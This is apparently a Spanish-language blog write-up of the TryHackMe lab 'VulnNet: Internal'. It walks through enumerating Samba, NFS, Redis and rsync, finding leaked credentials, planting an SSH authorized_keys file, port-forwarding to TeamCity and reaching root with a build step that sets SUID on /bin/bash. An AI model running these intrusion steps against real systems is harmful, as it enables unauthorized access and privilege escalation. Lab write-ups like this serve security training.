---
title: "VulnNet: Internal - THM Writeup"
layout: single
excerpt: "Vulnnet Internal es una maquina donde se explotan diferentes servicio como _samba_, _Redis_, _Rsync_, para luego escalar privilegios mediante otro servicio que esta ejecutandose internamente en la maquina con permisos de superusuario, accediendo a el mediante un port forwarding."
show_date: true
classes: wide
header:
  teaser: "https://github.com/z3rObyte/z3rObyte.github.io/blob/master/assets/images/VulnNet-internal-Tryhackme/images/teaser.png?raw=true"
  teaser_home_page: true
  icon: "assets/images/icons/TryHackMe-icon.png"
categories:
  - Writeup
  - TryHackMe
tags:
  - Redis
  - Samba
  - Rsync
  - Port Forwarding
  - NFS
---

# VulnNet: Internal Writeup
---

VulnNet: Internal es una máquina Linux de la plataforma de **TryHackMe** donde se deberán explotar diferentes servicios como _Samba, Redis, Rsync_, etc.

# Enumeración
---

Empezamos utilizando la utilidad ```ping``` para enviar una traza ICMP a la máquina para ver si está activa

```bash
$~  ping -c 1 10.10.44.60       
PING 10.10.44.60 (10.10.44.60) 56(84) bytes of data.
64 bytes from 10.10.44.60: icmp_seq=1 ttl=63 time=112 ms

--- 10.10.44.60 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 112.036/112.036/112.036/0.000 ms

```

Como se puede ver, la máquina nos responde.  

Mediante el TTL se puede saber el sistema operativo de la máquina, que en este caso es Linux. 

[Aquí](https://subinsb.com/default-device-ttl-values/){:target="_blank"}{:rel="noopener nofollow"} puedes consultar como identificar el OS por el TTL. O también puedes utilizar mi herramienta [OSidentifier](https://github.com/z3rObyte/OSidentifier){:target="_blank"}{:rel="noopener nofollow"} 


### Nmap

Empecemos con el escaneo de puertos con ```nmap```:

```bash

$~  nmap -p- --open -n -v -T5 10.10.44.60 -sC -sV                                                                            


Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 16:35 WEST
Not shown: 34582 filtered ports, 30944 closed ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39085/tcp   mountd
|   100005  1,2,3      39189/tcp6  mountd
|   100005  1,2,3      56555/udp   mountd
|   100005  1,2,3      57963/udp6  mountd
|   100021  1,3,4      33957/udp6  nlockmgr
|   100021  1,3,4      34127/tcp   nlockmgr
|   100021  1,3,4      44773/tcp6  nlockmgr
|   100021  1,3,4      46176/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open  rsync       (protocol version 31)
34127/tcp open  nlockmgr    1-4 (RPC #100021)
38403/tcp open  java-rmi    Java RMI
39085/tcp open  mountd      1-3 (RPC #100005)
57689/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.30 seconds
```

Vemos que tenemos varios servicios disponibles donde empezar a enumerar, en mi caso empezaré por el **Samba**

### Samba

Haré uso de la herramienta ```smbclient``` para ver si tenemos la capacidad de hacer un Null Sesion (Ingresar sin credenciales):

```bash
$~ smbclient -L 10.10.44.60 -N       

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Se puede ver que hay un recurso compartido con el nombre **shares**, veamos lo que hay dentro 

```bash
smbclient //10.10.44.60/shares -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 09:20:09 2021
  ..                                  D        0  Tue Feb  2 09:28:11 2021
  temp                                D        0  Sat Feb  6 11:45:10 2021
  data                                D        0  Tue Feb  2 09:27:33 2021

		11309648 blocks of size 1024. 3275916 blocks available
smb: \> ls data/*
  .                                   D        0  Tue Feb  2 09:27:33 2021
  ..                                  D        0  Tue Feb  2 09:20:09 2021
  data.txt                            N       48  Tue Feb  2 09:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 09:27:33 2021

    11309648 blocks of size 1024. 3275916 blocks available
smb: \> ls temp/*
  .                                   D        0  Sat Feb  6 11:45:10 2021
  ..                                  D        0  Tue Feb  2 09:20:09 2021
  services.txt                        N       38  Sat Feb  6 11:45:09 2021

		11309648 blocks of size 1024. 3275916 blocks available
smb: \>
```
Tenemos 2 directorios: **temp** y **data**

* Directorio temp --> flag services.txt
* Directorio data --> data.txt y bussines-req.txt

Despues de descargar estos archivos y analizarlos, me doy cuenta de que no contienen nada valioso.

Asi que prosigo a enumerar el NFS que me ha facilitado el escaneo de ```nmap```

### NFS

Utilizo ```showmount``` que es una herramienta que nos da información sobre monturas NFS:

```bash
$~  showmount -e 10.10.44.60         
Export list for 10.10.44.60:
/opt/conf *
```
Y vemos que hay una montura de /opt/conf. Monto ese recurso en mi equipo y veo que hay varios directorios:

```bash
$~ sudo mount -t nfs 10.10.44.60:/opt/conf ./mount ; ls ./mount 
 
 hp   init   opt   profile.d   redis   vim   wildmidi
 
```
Tenemos varias carpetas donde buscar archivos críticos, podríamos ir una por una, pero yo en este caso voy a utilizar ```grep```:

```bash
$~  grep -i -r -E "pass|user" .

./profile.d/vte-2.91.sh:  printf "\033]0;%s@%s:%s\007%s" "${USER}" "${HOSTNAME%%.*}" "${pwd}" "$(__vte_osc7)"
./vim/vimrc:" Vim will load $VIMRUNTIME/defaults.vim if the user does not have a vimrc.
./redis/redis.conf:# 2) No password is configured.
./redis/redis.conf:# Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7.
./redis/redis.conf:# This will make the user aware (in a hard way) that data is not persisting
./redis/redis.conf:# 3) Replication is automatic and does not need user intervention. After a
./redis/redis.conf:# If the master is password protected (using the "requirepass" configuration
./redis/redis.conf:# masterauth <master-password>
./redis/redis.conf:requirepass "B65Hx562*******F"
./redis/redis.conf:# resync is enough, just passing the portion of data the slave missed while
./redis/redis.conf:# Require clients to issue AUTH <PASSWORD> before processing any other
./redis/redis.conf:# Warning: since Redis is pretty fast an outside user can try up to
./redis/redis.conf:# 150k passwords per second against a good box. This means that you should
./redis/redis.conf:# use a very strong password otherwise it will be very easy to break.
./redis/redis.conf:# requirepass foobared
./redis/redis.conf:# DEL, UNLINK and ASYNC option of FLUSHALL and FLUSHDB are user-controlled.
./redis/redis.conf:# Specifically Redis deletes objects independently of a user call in the
./redis/redis.conf:# the Redis server starts emitting a log to inform the user of the event.
./redis/redis.conf:# and refuses to start. When the option is set to no, the user requires
./redis/redis.conf:# already issued by the script but the user doesn't want to wait for the natural
./redis/redis.conf:# of users to deploy it in production.
./redis/redis.conf:# The point "2" can be tuned by user. Specifically a slave will not perform
./redis/redis.conf:# Via the LATENCY command this information is available to the user that can
./redis/redis.conf:#  By default all notifications are disabled because most users don't need
./redis/redis.conf:# a good idea. Most users should use the default of 10 and raise this up to
./init/lightdm.conf:	    # Single-user mode
```

Y si teneís buen ojo, podemos ver que hemos encontrado una contraseña en el archivo redis.conf, que es un servicio que está corriendo actualmente en la máquina

Veamos como funciona este servicio y enumeremos este para ver si contiene información útil.

### Redis

Hago uso de ```redis-cli``` para autenticarme en el servicio con la contraseña que he encontrado:

```bash
$~  redis-cli -h 10.10.44.60

10.10.44.60:6379> auth B65Hx562*******F
OK
10.10.44.60:6379>
```
¡La credencial es válida!

Después de googlear bastante, me encontré con un [recurso](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis){:target="_blank"}{:rel="noopener nofollow"} bastante bueno sobre este servicio, del cual me fijé para enumerarlo.

```bash

$~  redis-cli -h 10.10.44.60

10.10.44.60:6379> info

[...]

# Keyspace
db0:keys=5,expires=0,avg_ttl=0

10.10.44.60:6379>

```
Vemos que hay base de datos con el identificador '0'

Miremos que hay dentro: 

```bash
10.10.44.60:6379> select 0

OK

10.10.44.60:6379> keys *

1) "authlist"
2) "tmp"
3) "marketlist"
4) "int"
5) "internal flag"

10.10.44.60:6379> 
```

Hay varios recursos, se puede ver la flag "Internal flag" y otros archivos más. Tras inspeccionar todos los ficheros, me doy cuenta de que el recurso "authlist" contiene una cadena de texto sospechosa encriptada en base64. Tras desencriptarla me encuentro con una sorpresa:

```bash
10.10.44.60:6379> lrange authlist 0 10

1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="

10.10.44.60:6379> exit

$~  echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="| base64 -d 

Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v

$~  
```

Nada más y nada menos que credenciales para el servicio **Rsync**.

Tras volver a googlear en busca de información sobre este servicio, encuentro un [recurso](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync){:target="_blank"}{:rel="noopener nofollow"} de utilidad casualmente en la misma página que habia consultado anteriormente.

Y me dispongo a enumerar el servicio **Rsync**.

### Rsync

```bash
$~  rsync -av --list-only rsync://10.10.44.60/

files          	Necessary home interaction

```

Un recurso compartido de nombre files, accedamos a él con nuestras credenciales a ver que encontramos:

```bash
$~   rsync  rsync://rsync-connect@10.10.44.60/files/  

Password: 
drwxr-xr-x          4,096 2021/02/01 12:51:14 .
drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal

$~   rsync  rsync://rsync-connect@10.10.44.60/files/sys-internal/

Password: 
drwxr-xr-x          4,096 2021/02/06 12:49:29 .
-rw-------             61 2021/02/06 12:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 13:33:19 .bash_history
-rw-r--r--            220 2021/02/01 12:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 12:51:14 .bashrc
-rw-r--r--             26 2021/02/01 12:53:18 .dmrc
-rw-r--r--            807 2021/02/01 12:51:14 .profile
lrwxrwxrwx              9 2021/02/02 14:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 12:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 19:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 12:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 11:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 11:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 09:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 12:53:57 .config
drwx------          4,096 2021/02/01 12:53:19 .dbus
drwx------          4,096 2021/02/01 12:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 12:53:22 .local
drwx------          4,096 2021/02/01 13:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 11:43:14 .ssh
drwx------          4,096 2021/02/02 11:16:16 .thumbnails
drwx------          4,096 2021/02/01 12:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 12:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 13:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 12:53:22 Music
drwxr-xr-x          4,096 2021/02/01 12:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 12:53:22 Public
drwxr-xr-x          4,096 2021/02/01 12:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 12:53:22 Videos

```

Dentro del directorio files, encontramos otro con nombre sys-internal, y ya dentro de ahí, varios recursos.

Se puede ver la flag user.txt y un directorio potencial a enumerar que es ".ssh" en busca de claves SSH.

Veamos si tenemos capacidad de subida de archivos:

```bash 
$~  > file.txt
      

Hola esto es una prueba

^C

$~  cat file.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: file.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ 
   3   │ Hola esto es una prueba
   4   │ 
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

$~  rsync -a ~/CTF/THM/VulnNet-internal/file.txt rsync://rsync-connect@10.10.44.60/files/sys-internal/.ssh/   

Password: 

$~  rsync rsync://rsync-connect@10.10.44.60/files/sys-internal/.ssh/ 

Password: 
drwxrwxr-x          4,096 2021/06/02 16:21:04 .
-rw-r--r--             27 2021/06/02 16:15:29 file.txt

$~  
```

Y sí, disponemos de capacidad de subir archivos

Después de esto, tenemos acceso asegurado, creando un par de **claves ssh** y subiendo el _id_rsa.pub_ al servidor como _authorized_keys_, podremos conectarnos al SSH sin necesidad de ingresar contraseña.

```bash
$~  ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/home/z3r0byte/.ssh/id_rsa): /home/z3r0byte/CTF/THM/VulnNet-internal/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/z3r0byte/CTF/THM/VulnNet-internal/id_rsa
Your public key has been saved in /home/z3r0byte/CTF/THM/VulnNet-internal/id_rsa.pub
The key fingerprint is:
SHA256:3h3526****idN1WsE9D8o0UkCFcY+****8WJCofGsWKSc z3r0byte@z3r0byte
The key's randomart image is:
+---[RSA 3072]----+
|       ..o+=o    |
|      . .o.o.o   |
|   . . .  *.. o .|
|    E =  +.+o..+.|
|     = oS =+oo .+|
|      +. . +oo .+|
|     o  . . o.oo.|
|           .o.++ |
|           ..+o o|
+----[SHA256]-----+

$~  rsync -a ~/CTF/THM/VulnNet-internal/id_rsa.pub rsync://rsync-connect@10.10.44.60/files/sys-internal/.ssh/authorized_keys

Password: 

$~  ssh -i id_rsa sys-internal@10.10.44.60

The authenticity of host '10.10.44.60 (10.10.44.60)' can't be established.
ECDSA key fingerprint is SHA256:0ysriVjo72WRJI6UecJ9s8z6QHPNn*******O6Vr4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.44.60' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$ 
```
¡Y hemos conseguido shell! ¡Ahora a por el root!

# Escalada de Privilegios

Tras enumerar el sistema, me doy cuenta de que hay un directorio en la raíz que no viene por defecto.

Lo enumero y me encuentro lo siguiente:

```bash
sys-internal@vulnnet-internal:/$ ls

TeamCity  bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  swapfile  sys  tmp  usr  var  vmlinuz  vmlinuz.old

sys-internal@vulnnet-internal:/$ cd TeamCity/

sys-internal@vulnnet-internal:/TeamCity$ ls

BUILD_85899  TeamCity-readme.txt  Tomcat-running.txt  bin  buildAgent  conf  devPackage  lib  licenses  logs  service.properties  temp  webapps  work

sys-internal@vulnnet-internal:/TeamCity$ cat TeamCity-readme.txt

This is the JetBrains TeamCity home directory.

To run the TeamCity server and agent using a console, execute:
* On Windows: `.\bin\runAll.bat start`
* On Linux and macOS: `./bin/runAll.sh start`

By default, TeamCity will run in your browser on `http://localhost:80/` (Windows) or `http://localhost:8111/` (Linux, macOS). If you cannot access the default URL, try these Troubleshooting tips: https://www.jetbrains.com/help/teamcity/installing-and-configuring-the-teamcity-server.html#Troubleshooting+TeamCity+Installation.

For evaluation purposes, we recommend running both server and agent. If you need to run only the TeamCity server, execute:
* On Windows: `.\bin\teamcity-server.bat start`
* On Linux and macOS: `./bin/teamcity-server.sh start`

For licensing information, see the "licenses" directory.

More information:
TeamCity documentation: https://www.jetbrains.com/help/teamcity/teamcity-documentation.html
```
Nos encontramos con algún tipo de servicio web que está corriendo en la máquina.

El readme.txt nos dice que en sistemas Linux, el servicio corre por defecto en el puerto 8111.

```bash
sys-internal@vulnnet-internal:/TeamCity$ ss | grep "8111"

tcp  CLOSE-WAIT 1       0                          [::ffff:127.0.0.1]:50027                                 [::ffff:127.0.0.1]:8111                             
tcp  ESTAB      0       0                          [::ffff:127.0.0.1]:8111                                  [::ffff:127.0.0.1]:41129                            
tcp  ESTAB      0       0                          [::ffff:127.0.0.1]:41129                                 [::ffff:127.0.0.1]:8111                             

sys-internal@vulnnet-internal:/TeamCity$ 
```
Y vemos que sí, el servicio esta corriendo en el puerto 8111.

Entonces, se me ocurre hacer un **Port Forwarding** para que el puerto 8111 de la maquina equivalga al puerto 8111 de mi equipo, esto para poder acceder a este servicio web a través de mi navegador.

```bash
$~  sudo ssh -i id_rsa sys-internal@10.10.44.60 -L 8111:127.0.0.1:8111

Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jun  2 17:56:07 2021 from 10.8.92.98
sys-internal@vulnnet-internal:~$ 

```

Ya después de esto, puedo ver el servicio desde mi navegador:



<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador1.png">



Vemos un panel de inicio de sesión. 

Me interesa la opcion de **ingresar como super usuario** asi que clico ahí:



<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador2.png">


Y vemos que nos pide un token de autenticación.

Estuve estancado en esta parte unos 30 minutos, buscando en google tokens por defecto, etc.

Hasta que se me ocurrió la idea de hacer uso de la utilidad ```grep``` para buscar de manera recursiva palabras clave en el directorio TeamCity

Y estos fueron los resultados:

```bash
sys-internal@vulnnet-internal:/TeamCity$ grep -i -r "authentication token" 2>/dev/null

[...]

logs/catalina.out:[TeamCity] Super user authentication token: 84466291****4945175 (use empty username with the token as the password to access the server)
logs/catalina.out:[TeamCity] Super user authentication token: 844****153054945175 (use empty username with the token as the password to access the server)
logs/catalina.out:[TeamCity] Super user authentication token: 378256259****957776 (use empty username with the token as the password to access the server)
logs/catalina.out:[TeamCity] Super user authentication token: 581****377764625872 (use empty username with the token as the password to access the server)
logs/catalina.out:[TeamCity] Super user authentication token: 602356221****083082 (use empty username with the token as the password to access the server)
logs/catalina.out:[TeamCity] Super user authentication token: 602****215617083082 (use empty username with the token as the password to access the server)

sys-internal@vulnnet-internal:/TeamCity$

```

Me encuentro con esto.

Tras hacer un gesto de celebración, pruebo cada uno de estos tokens para ver si funcionan.

Funciona uno de ellos y consigo acceder al panel de administracion de este servicio web:


<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador3.png">


Clico en el botón de _create a new project_ y luego en _Manually_ y sale lo siguiente:


<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador4.png">


Le pongo un nombre al proyecto y le doy a _create_

Y se muestra lo siguiente:

<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador5.png">


Después de esto, le damos a _Create Build Configuration_ 

Ahi ponemos otro nombre (da igual cual) y le damos a _create_

Nos deberia aparecer esto:


<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador6.png">


Aqui clicais arriba donde pone _root project_.

Abajo debería de aparecer el nombre de vuestro proyecto, le damos ahí.

Y tiene que salir lo siguiente:

<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador7.png">


A continuación, le damos click al nombre que que le habeis puesto al _build configuration_.

Que en este caso el mio es "No se lo digas a nadie"


<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador8.png">


Luego de esto, hacemos click en la izquierda donde pone _build steps_.

Y le damos a _Add build steps_.

Ahora debería pedir que elijamos un lenguaje de programación.

En mi caso voy a elegir _Command Line_.


<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador9.png">


Despues de elegir el lenguaje, nos saldra una pestaña donde podremos hacer un script

Como yo he elegido la linea de comandos como lenguaje, voy a hacer un script que asigne permisos SUID a /bin/bash

El script quedaria tal que así:


<img src="https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/VulnNet-internal-Tryhackme/images/Navegador10.png">


Luego de esto practicamente ya está, hacemos click arriba en _run_ y la /bin/bash de la máquina tendria permisos SUID

Lo que se traduce en que nos podemos convertir en usuario root

```bash

sys-internal@vulnnet-internal:/TeamCity$ bash -p 
bash-4.4# whoami
root
bash-4.4# 

```

Y ya estaría

# Opinión

Me ha parecido una muy buena máquina, donde he aprendido sobre varios servicios que desconocía.

Esta máquina de verdad ha puesto a prueba mis habilidades de búsqueda y paciencia ya que he tenido que googlear mucho para encontrar la información sobre los servicios.

Máquina recomendable. [Link](https://tryhackme.com/room/vulnnetinternal){:target="_blank"}{:rel="noopener nofollow"} a VulnNet: Internal


